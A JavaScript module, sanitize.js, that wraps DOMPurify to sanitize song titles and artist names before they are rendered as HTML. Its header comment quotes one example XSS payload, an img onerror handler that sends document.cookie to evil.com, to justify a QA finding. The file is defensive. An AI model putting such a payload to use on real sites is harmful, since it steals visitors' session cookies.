/**
 * sanitize.js
 * ─────────────────────────────────────────────────────────────
 * Thin wrapper around DOMPurify for safe HTML rendering.
 *
 * HOW TO USE
 * ----------
 * 1. Add this script to every page that renders database content into HTML:
 *      <script src="https://cdnjs.cloudflare.com/ajax/libs/dompurify/3.1.6/purify.min.js"></script>
 *      <script type="module" src="./sanitize.js"></script>
 *
 * 2. Replace every direct innerHTML / template-literal injection like:
 *      element.innerHTML = `<p>${song.title}</p>`;
 *    with:
 *      import { sanitizeHTML, safeText } from './sanitize.js';
 *      element.innerHTML = sanitizeHTML(`<p>${song.title}</p>`);
 *    or, for plain text content (preferred when no HTML needed):
 *      element.textContent = safeText(song.title);
 *
 * WHY THIS MATTERS (QA report — TC-S08, severity HIGH)
 * ─────────────────────────────────────────────────────────────
 * Artist names / song titles from the database are inserted via innerHTML.
 * A malicious value like:  <img src=x onerror="fetch('https://evil.com/?c='+document.cookie)">
 * would execute in every visitor's browser. DOMPurify strips all script
 * vectors while keeping safe formatting tags (b, i, span, etc.).
 */

/**
 * Sanitize an HTML string before inserting it into the DOM.
 * @param {string} dirty  — raw string from DB or user input
 * @returns {string}       — safe HTML string
 */
export function sanitizeHTML(dirty) {
  if (typeof DOMPurify === 'undefined') {
    console.error('[ORPHEUS] DOMPurify is not loaded. Load purify.min.js before sanitize.js.');
    // Fallback: escape everything — safer than passing dirty content
    return escapeHTML(dirty);
  }
  return DOMPurify.sanitize(dirty, {
    ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'span', 'br'],
    ALLOWED_ATTR: ['class'],
  });
}

/**
 * Return a safe plain-text string — strips ALL HTML.
 * Use this for song titles, artist names, and any content
 * that should never contain markup.
 * @param {string} dirty
 * @returns {string}
 */
export function safeText(dirty) {
  if (typeof DOMPurify === 'undefined') {
    return escapeHTML(String(dirty ?? ''));
  }
  return DOMPurify.sanitize(String(dirty ?? ''), { ALLOWED_TAGS: [] });
}

/**
 * Manual HTML escape — used as a zero-dependency fallback.
 * @param {string} str
 * @returns {string}
 */
function escapeHTML(str) {
  return String(str ?? '')
    .replace(/&/g,  '&amp;')
    .replace(/</g,  '&lt;')
    .replace(/>/g,  '&gt;')
    .replace(/"/g,  '&quot;')
    .replace(/'/g,  '&#x27;');
}
